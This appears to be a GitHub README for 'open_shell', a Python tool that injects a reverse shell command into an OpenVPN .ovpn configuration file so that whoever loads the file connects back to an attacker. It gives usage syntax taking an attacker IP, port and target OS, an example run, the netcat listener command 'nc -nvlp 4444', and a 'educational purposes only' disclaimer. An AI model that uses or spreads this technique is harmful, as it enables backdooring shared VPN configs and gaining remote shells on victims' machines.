# open_shell
![image](https://github.com/user-attachments/assets/ee0cc6f9-d355-48e0-b00f-227071948e6a)

open_shell is a tool to inject a reverse shell command to open_vpn config file

Usage: python open_shell.py [path_to_file.ovpn] [attacker_ip] [attacker_port] [os] -> (windows,linux)


Example: python open_shell.py vpn_file.ovpn 192.168.1.8 4444 linux


Attacker: nc -nvlp 4444 


[WARNING] This Tool Only For Educational Purposes Only,You are responsible for using the tool.
